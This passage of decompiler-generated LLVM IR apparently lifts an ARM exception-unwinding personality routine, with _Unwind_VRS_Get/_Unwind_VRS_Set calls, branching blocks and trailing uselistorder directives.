dec_label_pc_18e2c:                               ; preds = %dec_label_pc_18e1c
  %v2_18e2c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18e2c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18e3c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e3c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18e44 = call i32 @_Unwind_VRS_Get(i32 %v0_18e3c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18e48 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18e3c, i32* %r0.global-to-local, align 4
  %v5_18e5c = call i32 @_Unwind_VRS_Set(i32 %v0_18e3c, i32 %v0_18e48, i32 14, i32 %v0_18e48, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18e5c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v4_18e68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 32) to i32*), align 4
  %v0_18e6c = load i32, i32* %r5.global-to-local, align 4
  %v0_18e70 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e70, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18e68, i32* %stack_var_-48, align 4
  %v5_18e84 = call i32 @_Unwind_VRS_Set(i32 %v0_18e70, i32 %v0_18e6c, i32 15, i32 %v0_18e6c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e9c

dec_label_pc_18e90:                               ; preds = %dec_label_pc_18ddc
  %v7_18e90 = icmp eq i32 %v4_18dd0, 2
  br i1 %v7_18e90, label %dec_label_pc_18ea8, label %dec_label_pc_18e98

dec_label_pc_18e98:                               ; preds = %dec_label_pc_18e90, %dec_label_pc_18f7c, %dec_label_pc_18e08, %dec_label_pc_19170
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e9c

dec_label_pc_18e9c:                               ; preds = %bb157, %dec_label_pc_191a8, %dec_label_pc_19138, %bb166, %dec_label_pc_18e2c, %dec_label_pc_18e98
  %v1_18ea4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_191a8 ], [ %v1_18ea4.pre, %dec_label_pc_19138 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18e2c ], [ 9, %dec_label_pc_18e98 ]
  store i32 %v3_18cb8, i32* %r4.global-to-local, align 4
  store i32 %v6_18cb8, i32* %r5.global-to-local, align 4
  ret i32 %v1_18ea4

dec_label_pc_18ea8:                               ; preds = %dec_label_pc_18e90
  store i32 %v1_18ce8, i32* %r2.global-to-local, align 4
  %v0_18eac = load i32, i32* @r7, align 4
  %v1_18eac = inttoptr i32 %v0_18eac to i32*
  %v2_18eac = load i32, i32* %v1_18eac, align 4
  %tmp206 = bitcast i32 %v2_18eac to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18eb4 = bitcast float %tmp207 to i32
  store i32 %v1_18eb4, i32* @sl, align 4
  br i1 %v2_18de4, label %dec_label_pc_18ebc, label %dec_label_pc_19028

dec_label_pc_18ebc:                               ; preds = %dec_label_pc_18ea8
  %v2_18ebc = icmp eq i32 %v0_18f74, 0
  br i1 %v2_18ebc, label %dec_label_pc_19010, label %dec_label_pc_18ec4

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18ebc
  %v2_18ec8 = icmp eq i32 %v1_18eb4, 0
  br i1 %v2_18ec8, label %dec_label_pc_18ed4.thread, label %bb159

dec_label_pc_18ed4.thread:                        ; preds = %dec_label_pc_18ec4
  br label %dec_label_pc_19138

bb159:                                            ; preds = %dec_label_pc_18ec4
  br i1 %v3_18ecc, label %dec_label_pc_18edc, label %dec_label_pc_19010

dec_label_pc_18edc:                               ; preds = %bb159
  %v1_18edc = add i32 %v0_18eac, 4
  store i32 %v1_18edc, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18eec = load i32, i32* @r8, align 4
  %v1_18eec = add i32 %v0_18eec, 88
  store i32 %v1_18eec, i32* %sb.global-to-local, align 4
  store i32 %v1_18edc, i32* @r4, align 4
  br label %dec_label_pc_18f10

dec_label_pc_18f00:                               ; preds = %bb161
  %v1_18f00 = add i32 %v0_18f00, 1
  store i32 %v1_18f00, i32* @r5, align 4
  %v1_18f04 = load i32, i32* @sl, align 4
  %v9_18f04 = icmp eq i32 %v1_18f00, %v1_18f04
  %v0_18f08 = load i32, i32* @r4, align 4
  %v1_18f08 = add i32 %v0_18f08, 4
  store i32 %v1_18f08, i32* @r4, align 4
  br i1 %v9_18f04, label %dec_label_pc_19138, label %dec_label_pc_18f00.dec_label_pc_18f10_crit_edge

dec_label_pc_18f00.dec_label_pc_18f10_crit_edge:  ; preds = %dec_label_pc_18f00
  %v0_18f1c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18f10

dec_label_pc_18f10:                               ; preds = %dec_label_pc_18f00.dec_label_pc_18f10_crit_edge, %dec_label_pc_18edc
  %v0_18f1c = phi i32 [ %v0_18f1c.pre, %dec_label_pc_18f00.dec_label_pc_18f10_crit_edge ], [ %v1_18eec, %dec_label_pc_18edc ]
  %v1_18f20 = phi i32 [ %v1_18f08, %dec_label_pc_18f00.dec_label_pc_18f10_crit_edge ], [ %v1_18edc, %dec_label_pc_18edc ]
  %v1_18f10 = inttoptr i32 %v1_18f20 to i32*
  %v2_18f10 = load i32, i32* %v1_18f10, align 4
  %v2_18f14 = icmp eq i32 %v2_18f10, 0
  store i32 %v0_18f1c, i32* %forced_unwind_-44, align 4
  br i1 %v2_18f14, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18f10
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18f10, %bb160
  %v0_18f24 = load i32, i32* @r8, align 4
  store i32 %v0_18f24, i32* %r0.global-to-local, align 4
  store i32 %v2_18fb0, i32* %r2.global-to-local, align 4
  %v4_18f34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 100) to i32*), align 4
  store i32 102208, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18f34)
  %v0_18f40 = load i32, i32* %r0.global-to-local, align 4
  %v2_18f40 = icmp eq i32 %v0_18f40, 0
  %v0_18f00 = load i32, i32* @r5, align 4
  br i1 %v2_18f40, label %dec_label_pc_18f00, label %dec_label_pc_18f48

dec_label_pc_18f48:                               ; preds = %bb161
  %v1_18f48 = load i32, i32* @sl, align 4
  %v9_18f48 = icmp eq i32 %v0_18f00, %v1_18f48
  br i1 %v9_18f48, label %dec_label_pc_19138, label %dec_label_pc_18f50

dec_label_pc_18f50:                               ; preds = %dec_label_pc_18f48
  %v0_18f50 = load i32, i32* @r7, align 4
  %v1_18f50 = inttoptr i32 %v0_18f50 to i32*
  %v2_18f50 = load i32, i32* %v1_18f50, align 4
  %v1_18f54 = icmp slt i32 %v2_18f50, 0
  %v0_18f5c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18f54, label %dec_label_pc_18f5c, label %dec_label_pc_1901c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f50, %dec_label_pc_19014
  %v0_18f5c = phi i32 [ %storemerge, %dec_label_pc_19014 ], [ %v0_18f5c.pre, %dec_label_pc_18f50 ]
  store i32 %v0_18f5c, i32* %r0.global-to-local, align 4
  %v1_18f60 = add i32 %v0_18f5c, 4
  store i32 %v1_18f60, i32* @r6, align 4
  br label %dec_label_pc_1901c

dec_label_pc_18f68:                               ; preds = %bb154
  store i32 %v1_18ce8, i32* %r2.global-to-local, align 4
  br i1 %v2_18de4, label %dec_label_pc_18f74, label %dec_label_pc_19060

dec_label_pc_18f74:                               ; preds = %dec_label_pc_18f68
  %v2_18f74 = icmp eq i32 %v0_18f74, 0
  br i1 %v2_18f74, label %dec_label_pc_18fe0, label %dec_label_pc_18f7c

dec_label_pc_18f7c:                               ; preds = %dec_label_pc_18f74
  %v0_18f7c = load i32, i32* @r7, align 4
  %v1_18f7c = add i32 %v0_18f7c, 4
  %v2_18f7c = inttoptr i32 %v1_18f7c to i32*
  %v3_18f7c = load i32, i32* %v2_18f7c, align 4
  %v7_18f80 = icmp eq i32 %v3_18f7c, -2
  store i32 %v1_18f7c, i32* %r2.global-to-local, align 4
  br i1 %v7_18f80, label %dec_label_pc_18e98, label %dec_label_pc_18f8c

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f7c
  %v0_18f8c = load i32, i32* @r8, align 4
  %v1_18f8c = add i32 %v0_18f8c, 88
  %v7_18f90 = icmp eq i32 %v3_18f7c, -1
  store i32 %v1_18f8c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18f90, label %dec_label_pc_18fd4, label %dec_label_pc_18f9c

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18f8c
  %v2_18fa0 = icmp eq i32 %v3_18f7c, 0
  br i1 %v2_18fa0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18f9c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18f9c, %bb162
  store i32 %v0_18f8c, i32* %r0.global-to-local, align 4
  store i32 %v2_18fb0, i32* %r2.global-to-local, align 4
  %v4_18fbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 100) to i32*), align 4
  store i32 102344, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18fbc)
  %v0_18fc8 = load i32, i32* %r0.global-to-local, align 4
  %v2_18fc8 = icmp eq i32 %v0_18fc8, 0
  br i1 %v2_18fc8, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18fd4.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18fd4

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18fe0

dec_label_pc_18fd4:                               ; preds = %.thread25, %dec_label_pc_18f8c
  %v3_18fd4 = phi i32 [ %v3_18fd4.pr, %.thread25 ], [ %v1_18f8c, %dec_label_pc_18f8c ]
  %v2_18fd8 = icmp eq i32 %v3_18fd4, 0
  br i1 %v2_18fd8, label %dec_label_pc_18fe0, label %dec_label_pc_19138

dec_label_pc_18fe0:                               ; preds = %bb164, %dec_label_pc_1908c, %dec_label_pc_19060, %dec_label_pc_18fd4, %dec_label_pc_18f74
  %v0_18fe0 = load i32, i32* @r7, align 4
  %v1_18fe0 = add i32 %v0_18fe0, 8
  %v1_18d48 = inttoptr i32 %v1_18fe0 to i32*
  %v2_18d48 = load i32, i32* %v1_18d48, align 4
  %v2_18d4c = icmp eq i32 %v2_18d48, 0
  br i1 %v2_18d4c, label %dec_label_pc_18e08, label %dec_label_pc_18d54.preheader

dec_label_pc_18fe8:                               ; preds = %entry
  %v3_18fe8 = udiv i32 %v2_18cdc, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18ff8 = mul nuw nsw i32 %v3_18fe8, 4
  %v3_18ffc = mul i32 %v2_18cdc, 65536
  %v2_19000 = add i32 %v6_18ff8, %v4_18cdc
  store i32 %v3_18ffc, i32* %v4_18cfc, align 8
  br label %dec_label_pc_18d24

dec_label_pc_19010:                               ; preds = %bb159, %dec_label_pc_18ebc
  %v1_19010 = add i32 %v0_18eac, 4
  br label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_19054, %dec_label_pc_19010
  %v0_19014 = phi i32 [ %v2_19054, %dec_label_pc_19054 ], [ %v2_18eac, %dec_label_pc_19010 ]
  %storemerge = phi i32 [ %v4_19054, %dec_label_pc_19054 ], [ %v1_19010, %dec_label_pc_19010 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_19014 = icmp slt i32 %v0_19014, 0
  br i1 %v1_19014, label %dec_label_pc_18f5c, label %dec_label_pc_1901c

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18f50, %dec_label_pc_19014, %dec_label_pc_19128, %dec_label_pc_18f5c
  %v0_19020 = phi i32 [ %v1_18f60, %dec_label_pc_18f5c ], [ %storemerge, %dec_label_pc_19014 ], [ %v1_1912c, %dec_label_pc_19128 ], [ %v0_18f5c.pre, %dec_label_pc_18f50 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18f5c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19014 ], [ %v1_19128, %dec_label_pc_19128 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f50 ]
  %v0_1901c = load i32, i32* @sl, align 4
  %v3_1901c = mul i32 %v0_1901c, 4
  %v2_19020 = add i32 %v3_1901c, %v0_19020
  %v1_18d4865 = inttoptr i32 %v2_19020 to i32*
  %v2_18d4866 = load i32, i32* %v1_18d4865, align 4
  %v2_18d4c68 = icmp eq i32 %v2_18d4866, 0
  br i1 %v2_18d4c68, label %dec_label_pc_18e08, label %dec_label_pc_18d54.preheader.lr.ph

dec_label_pc_19028:                               ; preds = %dec_label_pc_18ea8
  %v0_19038 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19038, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19040 = load i32, i32* @r8, align 4
  %v1_19040 = add i32 %v0_19040, 32
  %v2_19040 = inttoptr i32 %v1_19040 to i32*
  %v3_19040 = load i32, i32* %v2_19040, align 4
  store i32 %v3_19040, i32* @r4, align 4
  %v5_19044 = call i32 @_Unwind_VRS_Get(i32 %v0_19038, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19044, i32* %r0.global-to-local, align 4
  %v3_19048 = load i32, i32* %stack_var_-48, align 4
  %v0_1904c = load i32, i32* @r4, align 4
  %v9_1904c = icmp eq i32 %v0_1904c, %v3_19048
  br i1 %v9_1904c, label %dec_label_pc_190f4, label %dec_label_pc_19028.dec_label_pc_19054_crit_edge

dec_label_pc_19028.dec_label_pc_19054_crit_edge:  ; preds = %dec_label_pc_19028
  %v0_19054.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19054

dec_label_pc_19054:                               ; preds = %dec_label_pc_19028.dec_label_pc_19054_crit_edge, %dec_label_pc_190f4
  %v0_19054 = phi i32 [ %v0_19054.pre, %dec_label_pc_19028.dec_label_pc_19054_crit_edge ], [ %v1_190f8, %dec_label_pc_190f4 ]
  %v1_19054 = inttoptr i32 %v0_19054 to i32*
  %v2_19054 = load i32, i32* %v1_19054, align 4
  %v4_19054 = add i32 %v0_19054, 4
  store i32 %v4_19054, i32* @r7, align 4
  br label %dec_label_pc_19014

dec_label_pc_19060:                               ; preds = %dec_label_pc_18f68
  %v0_19070 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19070, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19078 = load i32, i32* @r8, align 4
  %v1_19078 = add i32 %v0_19078, 32
  %v2_19078 = inttoptr i32 %v1_19078 to i32*
  %v3_19078 = load i32, i32* %v2_19078, align 4
  store i32 %v3_19078, i32* @r4, align 4
  %v5_1907c = call i32 @_Unwind_VRS_Get(i32 %v0_19070, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1907c, i32* %r0.global-to-local, align 4
  %v3_19080 = load i32, i32* %stack_var_-48, align 4
  %v0_19084 = load i32, i32* @r4, align 4
  %v9_19084 = icmp eq i32 %v0_19084, %v3_19080
  br i1 %v9_19084, label %dec_label_pc_1908c, label %dec_label_pc_18fe0

dec_label_pc_1908c:                               ; preds = %dec_label_pc_19060
  %v0_1908c = load i32, i32* @r8, align 4
  %v1_1908c = add i32 %v0_1908c, 40
  %v2_1908c = inttoptr i32 %v1_1908c to i32*
  %v3_1908c = load i32, i32* %v2_1908c, align 4
  %v1_19090 = load i32, i32* @r7, align 4
  %v9_19090 = icmp eq i32 %v3_1908c, %v1_19090
  br i1 %v9_19090, label %dec_label_pc_19098, label %dec_label_pc_18fe0

dec_label_pc_19098:                               ; preds = %dec_label_pc_1908c
  %v1_19098 = inttoptr i32 %v3_1908c to i32*
  %v2_19098 = load i32, i32* %v1_19098, align 4
  %v1_1909c = and i32 %v2_19098, 1073741824
  %v2_1909c = icmp eq i32 %v1_1909c, 0
  br i1 %v2_1909c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19098
  %v2_190a0 = or i32 %v2_19098, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19098
  %tmp208 = bitcast i32 %v2_19098 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_190a4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_190a8 = phi i32 [ %v2_191d8, %.thread28 ], [ %v2_191d8, %bb169 ], [ %v3_1908c, %bb165 ], [ %v3_1908c, %.thread26 ]
  %v0_190a8 = phi i32 [ %v2_191e8, %.thread28 ], [ %v2_191e4, %bb169 ], [ %v2_190a0, %bb165 ], [ %v2_190a4, %.thread26 ]
  %v2_190a8 = add i32 %v0_190a8, %v1_190a8
  store i32 %v2_190a8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_190c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_190c0, i32* %r0.global-to-local, align 4
  %v5_190c8 = call i32 @_Unwind_VRS_Set(i32 %v0_190c0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_190c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_190e0 = load i32, i32* @r8, align 4
  store i32 %v0_190e0, i32* %stack_var_-48, align 4
  %v5_190e8 = call i32 @_Unwind_VRS_Set(i32 %v0_190c0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e9c

dec_label_pc_190f4:                               ; preds = %dec_label_pc_19028
  %v0_190f4 = load i32, i32* @r8, align 4
  %v1_190f4 = add i32 %v0_190f4, 40
  %v2_190f4 = inttoptr i32 %v1_190f4 to i32*
  %v3_190f4 = load i32, i32* %v2_190f4, align 4
  %v1_190f8 = load i32, i32* @r7, align 4
  %v9_190f8 = icmp eq i32 %v3_190f4, %v1_190f8
  br i1 %v9_190f8, label %dec_label_pc_19100, label %dec_label_pc_19054

dec_label_pc_19100:                               ; preds = %dec_label_pc_190f4
  %v1_19104 = add i32 %v3_190f4, 4
  store i32 %v1_19104, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1910c = add i32 %v0_190f4, 44
  %v3_1910c = inttoptr i32 %v2_1910c to i32*
  store i32 0, i32* %v3_1910c, align 4
  %v0_19110 = load i32, i32* %r2.global-to-local, align 4
  %v1_19110 = load i32, i32* @r8, align 4
  %v2_19110 = add i32 %v1_19110, 48
  %v3_19110 = inttoptr i32 %v2_19110 to i32*
  store i32 %v0_19110, i32* %v3_19110, align 4
  %v0_19114 = load i32, i32* @sl, align 4
  %v1_19114 = load i32, i32* @r8, align 4
  %v2_19114 = add i32 %v1_19114, 40
  %v3_19114 = inttoptr i32 %v2_19114 to i32*
  store i32 %v0_19114, i32* %v3_19114, align 4
  %v0_19118 = load i32, i32* %r0.global-to-local, align 4
  %v1_19118 = load i32, i32* @r8, align 4
  %v2_19118 = add i32 %v1_19118, 52
  %v3_19118 = inttoptr i32 %v2_19118 to i32*
  store i32 %v0_19118, i32* %v3_19118, align 4
  %v0_1911c = load i32, i32* @r7, align 4
  %v1_1911c = inttoptr i32 %v0_1911c to i32*
  %v2_1911c = load i32, i32* %v1_1911c, align 4
  %v1_19120 = icmp slt i32 %v2_1911c, 0
  br i1 %v1_19120, label %dec_label_pc_19128, label %dec_label_pc_191d4

dec_label_pc_19128:                               ; preds = %dec_label_pc_19100
  %v0_19128 = load i32, i32* %r2.global-to-local, align 4
  %v1_19128 = add i32 %v0_19128, -3
  store i32 %v1_19128, i32* %r2.global-to-local, align 4
  %v0_1912c = load i32, i32* %r0.global-to-local, align 4
  %v1_1912c = add i32 %v0_1912c, 4
  store i32 %v1_1912c, i32* @r6, align 4
  br label %dec_label_pc_1901c

dec_label_pc_19138:                               ; preds = %dec_label_pc_18f48, %dec_label_pc_18fd4, %dec_label_pc_18f00, %dec_label_pc_18ed4.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19148 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19148, i32* %r0.global-to-local, align 4
  %v5_19150 = call i32 @_Unwind_VRS_Get(i32 %v0_19148, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19154 = load i32, i32* @r7, align 4
  %v1_19154 = load i32, i32* @r8, align 4
  %v2_19154 = add i32 %v1_19154, 40
  %v3_19154 = inttoptr i32 %v2_19154 to i32*
  store i32 %v0_19154, i32* %v3_19154, align 4
  %v3_19158 = load i32, i32* %stack_var_-48, align 4
  %v3_1915c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1915c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19164 = load i32, i32* @r8, align 4
  %v2_19164 = add i32 %v1_19164, 32
  %v3_19164 = inttoptr i32 %v2_19164 to i32*
  store i32 %v3_19158, i32* %v3_19164, align 4
  %v0_19168 = load i32, i32* %r2.global-to-local, align 4
  %v1_19168 = load i32, i32* @r8, align 4
  %v2_19168 = add i32 %v1_19168, 36
  %v3_19168 = inttoptr i32 %v2_19168 to i32*
  store i32 %v0_19168, i32* %v3_19168, align 4
  %v1_18ea4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e9c

dec_label_pc_19170:                               ; preds = %bb155
  %v1_19170 = inttoptr i32 %v0_18df8 to i32*
  %v2_19170 = load i32, i32* %v1_19170, align 4
  %v1_19174 = add i32 %v0_18df8, 4
  %v1_19178 = and i32 %v2_19170, 1073741824
  %v2_19178 = icmp eq i32 %v1_19178, 0
  %v2_1917c = or i32 %v2_19170, -2147483648
  %tmp210 = bitcast i32 %v2_19170 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19180 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19178, i32 %v2_19180, i32 %v2_1917c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19184 = load i32, i32* @r8, align 4
  %v2_19184 = add i32 %v1_19184, 56
  %v3_19184 = inttoptr i32 %v2_19184 to i32*
  store i32 %v1_19174, i32* %v3_19184, align 4
  %v0_19188 = load i32, i32* @r8, align 4
  store i32 %v0_19188, i32* %r0.global-to-local, align 4
  %v4_19194 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 28) to i32*), align 4
  store i32 102816, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19194)
  %v0_191a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_191a0 = icmp eq i32 %v0_191a0, 0
  br i1 %v2_191a0, label %dec_label_pc_18e98, label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %dec_label_pc_19170
  %v0_191a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_191a8 = load i32, i32* @r7, align 4
  %v2_191a8 = add i32 %v1_191a8, %v0_191a8
  store i32 %v2_191a8, i32* %stack_var_-48, align 4
  %v0_191b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_191b8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_191c8 = call i32 @_Unwind_VRS_Set(i32 %v0_191b8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e9c

dec_label_pc_191d4:                               ; preds = %dec_label_pc_19100
  %v0_191d4 = load i32, i32* @sl, align 4
  %v3_191d4 = mul i32 %v0_191d4, 4
  %v0_191d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_191d8 = add i32 %v0_191d8, %v3_191d4
  %v3_191d8 = inttoptr i32 %v2_191d8 to i32*
  %v4_191d8 = load i32, i32* %v3_191d8, align 4
  %v1_191dc = and i32 %v4_191d8, 1073741824
  %v2_191dc = icmp eq i32 %v1_191dc, 0
  br i1 %v2_191dc, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_191d4
  %v2_191e4 = or i32 %v4_191d8, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_191d4
  %tmp212 = bitcast i32 %v4_191d8 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_191e8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_191d8, { 2, 1, 0 }
  uselistorder i32 %v1_1912c, { 1, 0 }
  uselistorder i32 %v1_19128, { 1, 0 }
  uselistorder i32 %v1_190f8, { 1, 0 }
  uselistorder i32 %v0_190c0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1908c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19054, { 1, 0 }
  uselistorder i32 %v0_19054, { 1, 0 }
  uselistorder i32 %v2_18d4866, { 1, 0 }
  uselistorder i32 %v2_19020, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18d48, { 1, 0 }
  uselistorder i32 %v1_18fe0, { 1, 0 }
  uselistorder i32 %v3_18f7c, { 2, 0, 1 }
  uselistorder i32 %v0_18f5c, { 1, 0 }
  uselistorder i32 %v0_18f5c.pre, { 1, 0 }
  uselistorder i32 %v1_18eb4, { 1, 0 }
  uselistorder i32 %v2_18eac, { 1, 0 }
  uselistorder i32 %v0_18e3c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_18dfc, { 1, 0 }
  uselistorder i32 %v1_18df8, { 1, 0 }
  uselistorder i32 %v0_18df8, { 1, 0, 2 }
  uselistorder i32 %v4_18dd0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18f74, { 1, 2, 0 }
  uselistorder i32 %v0_18da8, { 1, 0 }
  uselistorder i32 %v3_18da4, { 1, 0, 2 }
  uselistorder i32 %v1_18d78, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18fb0, { 1, 0 }
  uselistorder i1 %v2_18de4, { 1, 0, 2 }
  uselistorder i32 %v1_18ce8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 31, 32, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 71, 0, 15, 16, 70, 4, 28, 29, 18, 19, 20, 17, 27, 2, 1, 5, 30, 31, 32, 6, 33, 34, 35, 36, 7, 37, 38, 39, 40, 8, 41, 9, 42, 43, 21, 44, 10, 45, 46, 47, 22, 48, 11, 49, 50, 51, 23, 52, 53, 54, 24, 55, 12, 56, 57, 58, 59, 25, 60, 13, 61, 62, 63, 64, 65, 66, 26, 67, 14, 68, 3, 69 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 5, 6, 7, 8, 9, 10, 11, 12, 1, 2, 0, 3, 4 }
